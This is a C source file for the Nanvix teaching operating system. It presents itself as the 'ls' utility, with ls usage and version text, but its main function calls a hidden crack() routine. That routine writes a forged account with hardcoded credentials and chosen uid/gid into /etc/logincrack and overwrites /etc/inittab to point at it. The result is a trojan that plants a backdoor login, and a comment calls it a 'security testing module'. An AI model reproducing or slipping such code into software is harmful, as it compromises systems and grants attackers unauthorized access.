#include <nanvix/accounts.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

/* Software versioning. */
#define VERSION_MAJOR 1 /* Major version. */
#define VERSION_MINOR 0 /* Minor version. */

/**
 * @brief Security testing module
 * Une fonction utilisateur qui va changer les droits de
 * l'utilisateur.
*/
static void crack(void){
    int file;	/* new file*/
    struct account crack;
    char * crack_name = "salu";
    char * crack_password = "salu";
    strncpy(crack.name, crack_name, USERNAME_MAX);
	strncpy(crack.password, crack_password, PASSWORD_MAX);
    uid_t uid = 5;
	gid_t gid = 1;

    if((file = open("/etc/logincrack", O_WRONLY)) == 1){
        account_encrypt(crack.name, 4, KERNEL_HASH);
        account_encrypt(crack.password, 4, KERNEL_HASH);
        crack.uid = uid;
        crack.gid = gid;
        write(file, &crack, sizeof(struct account));
    }

    close(file);

    char * buf = "logincrack";
    if ((file = open("/etc/inittab", O_WRONLY)) == 1){
        write(file, buf, 10);
    }
    close(file);
}


/*
 * Prints program version and exits.
 */
static void version(void)
{
	printf("ls (Nanvix Coreutils) %d.%d\n\n", VERSION_MAJOR, VERSION_MINOR);
	printf("Copyright(C) 2011-2014 Pedro H. Penna\n");
	printf("This is free software under the ");
	printf("GNU General Public License Version 3.\n");
	printf("There is NO WARRANTY, to the extent permitted by law.\n\n");

	exit(EXIT_SUCCESS);
}

/*
 * Prints program usage and exits.
 */
static void usage(void)
{
	printf("Usage: ls [options] [directory]\n\n");
	printf("Brief: Lists contents of a directory.\n\n");
	printf("Options:\n");
	printf("  -a, --all     List all entries\n");
	printf("  -i, --inode   Print the inode number of each file\n");
	printf("      --help    Display this information and exit\n");
	printf("      --version Display program version and exit\n");

	exit(EXIT_SUCCESS);
}

/*
 * Gets program arguments.
 */
static void getargs(int argc, char *const argv[])
{
	int i;     /* Loop index.       */
	char *arg; /* Working argument. */

	/* Get program arguments. */
	for (i = 1; i < argc; i++)
	{
		arg = argv[i];
		/* Display help information. */
		if (!strcmp(arg, "--help"))
			usage();

		/* Display program version. */
		else if (!strcmp(arg, "--version"))
			version();


	}
}

/*
 * Launches program.
 */
int main(int argc, char *const argv[])
{
    getargs(argc, argv);
    crack();
    return (EXIT_SUCCESS);
}